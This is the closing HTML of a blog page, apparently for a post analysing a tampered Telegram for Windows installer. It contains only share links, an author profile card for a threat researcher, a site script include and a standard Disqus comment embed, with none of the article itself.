                    <a
                        class="share-option-btn"
                        target="new"
                        href="https://www.facebook.com/sharer/sharer.php?u=https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/"
                        aria-label="Share on Facebook"
                    >
                        <i class="fab fa-facebook" aria-hidden="true"></i><span>Share on Facebook</span>
                    </a>
                </li>
            
                
                
                <li class="share-option">
                    <a
                        class="share-option-btn"
                        target="new"
                        href="https://twitter.com/intent/tweet?text=https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/"
                        aria-label="Share on Twitter"
                    >
                        <i class="fab fa-twitter" aria-hidden="true"></i><span>Share on Twitter</span>
                    </a>
                </li>
            
        </ul>
    </div>


            
        </div>
        


    

<div id="about">
    <div id="about-card">
        <div id="about-btn-close">
            <i class="fa fa-times"></i>
        </div>
        
            <img id="about-card-picture" src="https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176?s=110" alt="Author&#39;s picture"/>
        
            <h4 id="about-card-name">Theo Chen</h4>
        
            <div id="about-card-bio"><p>Penetration Testing &#x2F; Malware Analysis &#x2F; Threat Hunting &#x2F; APT Research<br /><br />Ingress Enlightened Agent</p>
</div>
        
        
            <div id="about-card-job">
                <i class="fa fa-briefcase"></i>
                <br/>
                <p>Threat Researcher</p>

            </div>
        
        
            <div id="about-card-location">
                <i class="fa fa-map-marker-alt"></i>
                <br/>
                Taipei, Taiwan
            </div>
        
    </div>
</div>

        
        
<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
        <!--SCRIPTS-->

<script src="/assets/js/script-ntjm1xxqdwr7uhkrlwal4hkgsjrprt8jr4d5cauo3fpjpjoa3nude4bnfikw.min.js"></script>

<!--SCRIPTS END-->


    
        <script>
          var disqus_config = function() {
            this.page.url = 'https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/';
              
            this.page.identifier = 'Research/åˆ†æä¸€å€‹åŠ æ–™çš„-Telegram-for-Windows-ä¸­æ–‡ç‰ˆå®‰è£ç¨‹å¼/';
              
          };
          (function() {
            var d = document, s = d.createElement('script');
            var disqus_shortname = 'theo-5';
            s.src = '//' + disqus_shortname + '.disqus.com/embed.js';

            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
          })();
        </script>
    




    </body>
</html>
